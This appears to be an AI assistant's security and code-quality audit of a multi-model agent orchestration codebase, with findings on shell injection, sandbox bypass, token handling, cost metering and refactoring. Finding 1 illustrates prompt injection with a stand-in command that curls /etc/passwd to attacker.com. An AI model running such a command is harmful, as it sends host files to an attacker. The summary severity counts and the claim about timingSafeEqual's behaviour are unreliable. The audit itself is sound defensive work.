Now I have enough information to produce the comprehensive audit report.

---

# Audit Report: multi-model-agent v3.12.x → v4.0.0

**Scope:** Security, correctness, performance, and style review of the current codebase against the v4.0.0 spec in `docs/superpowers/specs/0.4.0/goal.md`.

**Audited files:** ~30+ source files across `packages/core/src/` and `packages/server/src/`, including all runners, HTTP handlers, sandbox, SSRF guard, escalation/fallback, tool definitions, config loading, auth, middleware, and routing.

---

## Security Findings

**1.**
Severity: critical
Location: packages/core/src/tools/definitions.ts:157
Issue: The `runShell` implementation passes the LLM-generated `command` string directly to Node's `child_process.exec()` (which spawns `/bin/sh -c <command>`). This is a command injection vector: a prompt-injected model, a malicious user instruction, or a compromised sub-agent output can execute arbitrary shell commands including `$(...)` expansions, pipe chains, and redirects. The `cwd` sandbox confines the working directory but does NOT restrict what commands the shell subprocesses can execute. A model told to "run `npm test`" could be tricked into running `npm test && curl http://attacker.com/?d=$(cat /etc/passwd)`.
Suggestion: Replace `exec` with `execFile` for known-safe commands, or wrap user commands in a restricted shell (e.g., `bash --restricted`) or use a process-level sandbox (seccomp/pledge).

**2.**
Severity: high
Location: packages/core/src/tools/definitions.ts:82
Issue: When `sandboxPolicy` is `'none'`, the `confine` variable is `false`, which skips ALL `assertWithinCwd` path-traversal checks for every tool (`readFile`, `writeFile`, `editFile`, `grep`, `listFiles`, `glob`). This allows an LLM sub-agent with `sandboxPolicy: 'none'` to read and write ANY file on the host filesystem that the Node process can access, including `~/.ssh/`, `/etc/passwd`, environment files, and other sensitive paths. The default is `'cwd-only'`, but callers (including `/delegate` HTTP handlers) can set `sandboxPolicy: 'none'` per-task.
Suggestion: Remove `sandboxPolicy: 'none'` as a configurable option, or require explicit operator opt-in with a startup flag and a warning logged to stderr when it's used.

**3.**
Severity: high
Location: packages/core/src/provider.ts:51
Issue: The `createProvider` function constructs an OpenAI client with `apiKey: apiKey || 'not-needed'` as a fallback when no API key is configured. The string `'not-needed'` is passed as the actual API key to the OpenAI SDK, which will send it as an `Authorization: Bearer not-needed` header to the configured `baseUrl`. If the `baseUrl` points to an attacker-controlled proxy or a misconfigured endpoint, the fake API key leaks no secrets — but if the operator intended a real deployment and forgot to set the API key, requests silently fail with 401 instead of surfacing a clear config error. More critically, the catch block on line 84 returns error results that include the model name from `providerConfig`, and errors from the SDK could include the baseUrl in stack traces.
Suggestion: Throw a clear configuration error when both `apiKey` and `apiKeyEnv` are missing/unset for an `openai-compatible` agent, instead of using a fake key. Same for the review path on line 97-103.

**4.**
Severity: medium
Location: packages/server/src/http/auth.ts:59-63
Issue: The `validateAuthHeader` function uses `crypto.timingSafeEqual` for constant-time comparison but performs an early length check: `if (presented.length !== expectedBuf.length) return { ok: false, reason: 'mismatch' }`. This short-circuit leaks the token length through timing — an attacker can determine the exact byte length of the bearer token before attempting to brute-force content. For a base64url-encoded 32-byte key (43 characters), the information leakage is modest but real.
Suggestion: Remove the length short-circuit; let `timingSafeEqual` handle the length mismatch internally (it returns false for different-length buffers). Or pad both buffers to a fixed maximum length before comparison.

**5.**
Severity: medium
Location: packages/core/src/config/load.ts:72-77
Issue: `collectInlineApiKeyOffenders` scans the config object and flags agent slots that have inline `apiKey` values. It logs a warning, but the config object with inline API keys is held in memory for the lifetime of the server process. A heap dump or debug endpoint could expose these plaintext keys. The `loadAuthToken` function properly warns about insecure file permissions (mode bits), but there's no equivalent memory-safety enforcement for inline keys.
Suggestion: Zero out the `apiKey` field on `ProviderConfig` after the provider is constructed, or require `apiKeyEnv` exclusively (disallow inline `apiKey` in production).

**6.**
Severity: medium
Location: packages/server/src/http/request-pipeline.ts:27-30
Issue: The request pipeline has no rate limiting on authentication failures. An attacker on localhost (or a compromised local process) can make unlimited POST requests to tool endpoints without rate limit, brute-forcing the bearer token. While the service binds to loopback-only (mitigating remote attacks), a malicious local process or npm package could exploit this.
Suggestion: Add exponential backoff or a simple in-memory rate limiter (e.g., 5 failures per second per remote address) on auth failures.

**7.**
Severity: low
Location: packages/core/src/config/load.ts:30-32
Issue: `loadAuthToken` accepts `MMAGENT_AUTH_TOKEN` from the environment without any validation of the token format or length. An empty string or a token with non-ASCII bytes is passed through verbatim. While HTTP bearer tokens can technically be any byte sequence, the file-based path applies strict validation (`TOKEN_REGEX`) but the env-var path skips it entirely, creating an inconsistency.
Suggestion: Apply the same `TOKEN_REGEX` validation to the env-var token path, or at minimum reject zero-length tokens.

**8.**
Severity: low
Location: packages/core/src/research/web-fetch.ts:219
Issue: The `extractBodyFromHTML` function parses arbitrary HTML with `JSDOM` and `Readability`. While JSDOM does not execute scripts by default, it does fetch external resources referenced in the HTML (images, stylesheets, etc.) unless configured otherwise. The `JSDOM` constructor on line 221 does not pass `{ resources: 'usable' }` or similar, so it should be safe — but the documentation for jsdom notes that some versions had default behaviors that could trigger network requests. This is a defense-in-depth concern for fetched content.
Suggestion: Explicitly pass `{ resources: new (require('jsdom')).ResourceLoader({ strictSSL: true }) }` and verify that no outbound requests are made during HTML parsing.

---

## Correctness / Logic Error Findings

**9.**
Severity: high
Location: packages/core/src/run-tasks/index.ts:88-100
Issue: The `PARALLEL_SAFETY_SUFFIX` is appended to every task when `resolved.length > 1`, but it always contains the text "Do NOT run full-project build commands" and conditionally appends the `testCommand`. However, this suffix uses the *original* `r.task.testCommand` — at this point, `r.task` might have been *replaced* on line 83 with `{ ...r.task, effort: inferred }` if effort was inferred. If `effort` was inferred, the spread creates a new object that includes `testCommand` from the original, so this is actually fine. The real issue is that the suffix is appended unconditionally to ALL tasks in a multi-task batch, even those that are supposed to run build commands (e.g., an `execute_plan` task whose plan explicitly says "run npm run build"). The suffix contradicts task-specific instructions.
Suggestion: Make the parallel safety suffix opt-in per task, or skip it for tasks that explicitly set `testCommand` to a build-like command.

**10.**
Severity: high
Location: packages/core/src/escalation/fallback.ts:176-178
Issue: In `runWithFallback`, when the assigned tier's provider is unavailable and resolution falls to the alt tier, the `fallbackFired` flag is set to `true` on line 209. However, on line 173-179, the `assigned` tier's identity separation check sets `fallbackReason = 'not_configured'` when `checkSeparation(assigned)` returns `{ skip: true }`. But the skip is due to identity separation (same model family as reviewer), not because the tier is not configured. This conflates "separation violation" with "not configured," causing the caller to see a misleading `fallbackReason`.
Suggestion: Introduce a new `FallbackReason` value `'identity_separation'` for when `checkSeparation` blocks a tier, distinct from `'not_configured'`.

**11.**
Severity: medium
Location: packages/core/src/runners/claude-runner.ts:347-348
Issue: The `queryOptions.maxTurns` is set to `Number.MAX_SAFE_INTEGER` for Claude runner. While the SDK will eventually cap this (or the task will time out), setting an unbounded turn limit means a runaway model could burn through the entire `maxCostUSD` budget before any limit is hit. The openai-runner has the same issue on line 218 of `openai-runner.ts`. The spec's `enums.md` says `read_only` tools get "2 attempts" and `artifact_producing` gets "7 attempts," but these are lifecycle-level attempt counts, not per-runner turn counts. The per-runner turn count is effectively unbounded.
Suggestion: Set a reasonable default `maxTurns` (e.g., 250) derived from the task type, or at minimum cap it to something like 500 to prevent runaway loops from consuming the full $10 cost budget in a single task.

**12.**
Severity: medium
Location: packages/core/src/delegate-with-escalation.ts:147-153
Issue: The `adjustedMaxCostUSD` computation subtracts `cumulativeCostUSD` from `task.maxCostUSD`, but `cumulativeCostUSD` is accumulated from `result.usage.costUSD` which may be `null` (when pricing data is unavailable). The line `cumulativeCostUSD += attemptCost` on line 143 uses `?? 0`, so null costs are treated as zero. This means if the pricing table is missing, retry attempts are effectively free from the cost-meter's perspective, and the actual spend could exceed `maxCostUSD` without detection.
Suggestion: When `costUSD` is null and `maxCostUSD` is set, treat retries conservatively (e.g., assume a minimum cost per attempt or cap retries at 1 regardless of cost tracking).

**13.**
Severity: medium
Location: packages/core/src/run-tasks/worker-status.ts:11-19
Issue: `extractWorkerStatus` classifies worker status by substring-matching the summary text. The check `s.includes('concerns')` on line 16 will match `'done_with_concerns'` AND any summary that happens to contain the word "concerns" in a different context (e.g., "no concerns with the implementation"). The order of checks means `'needs_context'` and `'blocked'` are checked first, but a summary like "The implementation has no concerns" would incorrectly trigger `done_with_concerns`.
Suggestion: Use word-boundary matching or exact phrase matching instead of naive `includes()`. Prefer `/\bdone_with_concerns\b/` or check for the exact marker format the structured report parser expects.

**14.**
Severity: medium
Location: packages/core/src/runners/claude-runner.ts:539-545
Issue: In the per-turn usage capture, `m.usage` is checked for existence but the code accesses `u.cache_read_input_tokens` and `u.cache_creation_input_tokens` with `?? null` defaults. The `inputTokens` and `outputTokens` fields, however, use `u.input_tokens ?? 0` and `u.output_tokens ?? 0`. If the API returns a usage object where these fields are absent (not just 0), the accumulator gets zero tokens for that turn, which is correct. But if the usage object has `input_tokens: 0` but non-zero `cache_read_input_tokens` (which can happen when the entire prompt is served from cache), the code on line 539 records `inputTokens: 0, cachedReadTokens: <non-zero>`. However, the later result-message code on lines 582-594 may replace the accumulator with the result message's cumulative totals, and on line 590-591 uses `turnInputTokens > 0 || turnOutputTokens > 0` as the condition to replace. If the entire conversation was cache-served (input=0, output>0), the replacement still triggers correctly via `turnOutputTokens > 0`. But if both are zero AND cache fields are present, the per-turn accumulator is preserved — which may be correct since no new tokens were consumed. Edge case: a turn that only produces thinking tokens with no regular output. The thinking tokens are captured in `reasoningTokens` (but set to null on line 542 since the per-turn capture doesn't extract reasoning). This is a known limitation documented in the code.
Suggestion: Extract reasoning tokens from per-turn usage if the API provides them (some Anthropic models do), and document the null-reasoning caveat for per-turn capture.

**15.**
Severity: low
Location: packages/core/src/escalation/fallback.ts:218-222
Issue: When `providerFor(usedTier)` throws during Step 4 (construction failure), the code tries the alt tier. But if the alt tier's `providerFor` also throws, the function returns `makeSyntheticFailure(assigned)` with `unavailableReason: 'not_configured'`. However, the original throw's error message is swallowed — the caller never sees WHY the provider construction failed (e.g., "invalid API key", "missing model profile"), making debugging difficult.
Suggestion: Preserve the construction error message in the synthetic failure's `error` field or log it via the event bus.

**16.**
Severity: low
Location: packages/core/src/runners/openai-runner.ts:259-263
Issue: The `canAffordNextTurn` function estimates next-turn cost using `lastTurnCostUSD > 0 ? lastTurnCostUSD : 0.001`. The `0.001` floor means that even on the first turn (when `lastTurnCostUSD` is 0), the cost meter is checked. However, if the last turn was served entirely from cache (cost=0), the meter uses 0.001 as the estimate, which might incorrectly block a turn when the budget has exactly 0 remaining. The spec says cost pre-stop is at 80% ($8 of $10), so this is unlikely to fire in practice, but the logic is fragile.
Suggestion: Use the actual cost of the most recent non-zero turn (or a running average), falling back to a conservative per-turn estimate based on the model's pricing profile.

---

## Performance Findings

**17.**
Severity: medium
Location: packages/core/src/escalation/fallback.ts:47-49
Issue: `providersIdentical` uses `JSON.stringify(a.config) === JSON.stringify(b.config)` to compare two provider configs. This is called on the hot path of every tier fallback decision. JSON.stringify on two potentially large config objects (including cost tables, capabilities arrays) is O(n) in the config size and allocates temporary strings on every comparison. In the lifecycle loop, this runs at least once per escalation decision (potentially hundreds of times across review rework rounds).
Suggestion: Pre-compute a hash or canonical identity string during provider construction and compare those instead. The `CanonicalIdentity` type already exists for this purpose; use `identityEquals` from `canonical-model-identity.js`.

**18.**
Severity: low
Location: packages/core/src/run-tasks/index.ts:41-55
Issue: `expandedTasks`, `readinessResults`, and `refusedResults` are each computed with a separate `.map()` over the full task array. Three sequential O(n) passes could be combined into one pass. While n is typically small (1–10 tasks), the context block expansion (`expandContextBlocks`) involves disk I/O or store lookups, and the readiness evaluation involves string analysis. Three separate passes mean context block expansion results aren't reused for the same task.
Suggestion: Combine the three passes into a single `for` loop that processes each task once, or use `Array.reduce` to build the three output arrays in a single traversal.

**19.**
Severity: low
Location: packages/core/src/tools/definitions.ts:188-203
Issue: The `glob` tool's `for await` loop checks `isWithin(realCwd, real)` for every matched entry, calling `fs.realpath` per entry. In a large directory tree (e.g., `node_modules/`), this can result in thousands of sequential `realpath` syscalls — each one a filesystem round-trip. `glob` already filters by pattern; the post-filter is defensive but expensive.
Suggestion: Batch-check symlink escapes by resolving the directory listing's parent once and comparing path prefixes, rather than `realpath`-ing each entry individually.

---

## Style / Maintainability Findings

**20.**
Severity: low
Location: packages/core/src/provider.ts:1-30
Issue: The `createProvider` function is ~130 lines and contains duplicated logic for `run` and `runReview` — both switch on the same `agentConfig.type` and create similar error handlers, OpenAI clients, and usage accumulators. The `run` and `runReview` closures are structurally identical (only differing in the runner function they call: `runCodex` vs `runCodexReview`, etc.). This is precisely the duplication the v4.0.0 restructure targets.
Suggestion: Extract the common "build provider strategy" logic into a shared helper; each runner variant should only differ by which function is called. The v4.0 `provider-factory.ts` + `runner-shell.ts` split directly addresses this.

**21.**
Severity: low
Location: packages/core/src/run-tasks/index.ts:1-110
Issue: The `runTasks` function dispatches `Promise.all(resolved.map(...))` on line 106, but the implementation of `executeReviewedLifecycle` inside each `.map()` callback accesses shared mutable state: `options.batchId`, `options.recordHeartbeat`, `options.logger`, etc. are all shared across concurrent task executions. If two tasks in the same batch call `recordHeartbeat` concurrently, and that callback mutates shared state (e.g., batch-level heartbeat tracking), there's a data race. The design comment in `DIRECTION.md` says "Concurrent work from multiple cwds is dispatched through a single HTTPListener," but concurrent tasks WITHIN a single cwd (execute_plan with 3+ tasks) share the same `batchId` and options.
Suggestion: Document clearly whether `recordHeartbeat`, `logger`, and `recorder` must be concurrency-safe, and if not, wrap each task's execution in a per-task clone of these callbacks.

**22.**
Severity: low
Location: packages/server/src/http/server.ts:115-120
Issue: The server registers tool handlers at BOTH `/delegate` and `/tools/delegate` (and similarly for all other tools). This is a compatibility shim that conflicts with the project's stated "no backward compatibility" rule (`development-mode.md`). The v4.0 spec's architecture.md shows only `/delegate` paths without the `/tools/` prefix.
Suggestion: In v4.0, drop the `/tools/` prefix variants and keep only the canonical paths as specified in `architecture.md`.

**23.**
Severity: low
Location: packages/core/src/escalation/fallback.ts:1
Issue: The `runWithFallback` function is approximately 370 lines of deeply nested conditional logic with multiple early-return paths, fallback branches, and separation-check interleaving. The v4.0 spec's architecture explicitly targets this: `escalation/policy.ts` is supposed to be ~100 lines with `escalation-policy.ts` handling the rotation rule independently. The current monolithic function is hard to test and audit.
Suggestion: Already planned for v4.0 split (`escalation-policy.ts` + `agent-resolver.ts`). Prioritize this extraction early in the migration.

**24.**
Severity: low
Location: packages/core/src/delegate-with-escalation.ts:1
Issue: The file is named `delegate-with-escalation.ts` but the opening comment says: "NOTE: Despite the name... This function NO LONGER performs status-level tier escalation as of 3.5.0... Rename to delegateWithRetries deferred to 3.6.0." Version 3.12.5 is shipping, and the rename still hasn't happened. The misleading name caused confusion during the audit.
Suggestion: Rename to `delegate-with-retries.ts` and update all imports. The v4.0 architecture moves this into `lifecycle/task-executor.ts` anyway.

**25.**
Severity: low
Location: packages/core/src/runners/claude-runner.ts:1-50
Issue: The `PushableUserMessageQueue` class (lines 50-105) is a hand-rolled async iterable queue. This is a general-purpose data structure that could be reused by other runners (e.g., if a future runner also needs streaming input injection). Currently it lives inline in `claude-runner.ts`.
Suggestion: Extract `PushableUserMessageQueue` to a shared utility in `runners/base/` so it can be reused. Low priority — v4.0's `runner-shell.ts` will centralize this.

**26.**
Severity: low
Location: packages/core/src/config/schema.ts:192-196
Issue: The `serverLimitsSchema` inside `multiModelConfigSchema` duplicates the same default structure that's already defined for `serverConfigSchema` (lines 210-218). If server defaults change, both places must be updated. The `server` field on `multiModelConfigSchema` is also partially redundant with `serverConfigSchema`.
Suggestion: Extract shared `serverLimitsSchema` and `serverDefaults` constants used by both schemas. Already planned in v4.0's `config/` restructure.

**27.**
Severity: low
Location: packages/core/src/types.ts:1-5
Issue: The `RunResult` type is ~280 lines and has grown organically with optional fields for every tool variant (`specReviewStatus`, `qualityReviewStatus`, `diffReviewStatus`, `verification`, `commits`, `stageStats`, `turnsByStage`, etc.). Many fields only apply to specific tools but live on the same type, making it impossible to know from the type alone which fields are populated for which tool. The v4.0 spec calls this out indirectly via the "Slim caller envelope" principle.
Suggestion: Per v4.0 design: split into a slim caller-response envelope (~10 fields) plus tool-specific parsed report types accessed through a discriminated union.

**28.**
Severity: low
Location: packages/core/src/runners/error-classification.ts:1
Issue: `classifyError` and `isProviderContextLimit` duplicate context-limit detection logic. `classifyError` calls `isProviderContextLimit` and then applies its own string matchers. The string patterns in `isProviderContextLimit` (lines 60-78) are a superset of patterns in `isContextLimit` inside `claude-runner.ts` (lines 107-132), which means context limit detection is inconsistent across runners. A context-limit from OpenAI might be classified differently than one from Claude.
Suggestion: Consolidate all error classification into a single module (`bounded-execution/error-classifier.ts` per v4.0 design). Remove per-runner duplicates.

---

## Spec-to-Code Gap Findings

These are structural differences between the current 3.12.x codebase and the v4.0.0 architecture specification:

**29.**
Severity: low
Location: packages/core/src/run-tasks/reviewed-lifecycle.ts (2048 LOC)
Issue: The spec's v4.0 architecture mandates a "500-LOC ceiling" as an emergent property of one-concept-per-file. `reviewed-lifecycle.ts` at 2048 lines is the most extreme violation — it bundles implementer dispatch, review orchestration, fallback handling, verify stage, commit, telemetry aggregation, and batch persistence into a single file. The v4.0 split into `lifecycle/lifecycle-driver.ts`, `lifecycle/task-executor.ts`, `review/reviewer-engine.ts`, `reporting/terminal-status-deriver.ts`, etc. directly addresses this.
Suggestion: Follow the v4.0 architecture plan. This finding is for awareness — no action needed beyond executing the planned migration.

**30.**
Severity: low
Location: packages/core/src/runners/{claude,openai,codex}-runner.ts
Issue: Three runner files duplicate ~1000+ LOC each of supervision loop, cost metering, scratchpad salvage, file tracking, re-grounding injection, format constraint suffix, and progress event emission. The v4.0 spec's `runner-shell.ts` design extracts this shared logic into one place, with each runner providing only an adapter. The current state makes adding a 4th provider ~1000 LOC of duplicated code.
Suggestion: Already planned in v4.0 C5 (`runner-shell.ts` + thin adapters). This is the highest-ROI extraction in the migration.

---

## Summary

| Severity | Count |
|----------|-------|
| critical | 1 |
| high     | 3 |
| medium   | 6 |
| low      | 20 |

The codebase is well-engineered overall, with thoughtful defenses (SSRF guard with IP pinning, timing-safe token comparison, cwd sandboxing, size caps on file I/O, credential-stripping in web fetch). The critical finding is the shell injection vector in `runShell` via `child_process.exec`. The structural issues (monolithic `reviewed-lifecycle.ts`, duplicated runner logic) are already addressed in the v4.0.0 architectural plan and represent planned work rather than undiscovered problems.
